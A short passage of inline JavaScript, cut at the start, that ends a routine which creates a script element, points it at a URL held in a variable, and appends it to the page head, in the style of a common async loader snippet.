s=document.createElement('script');s.type='text/javascript';s.async=true;s.src=u;try{s.setAttribute('data-rl',u);}catch(e){}(document.getElementsByTagName('head')[0]||document.documentElement).appendChild(s);}catch(e){}})();</script>
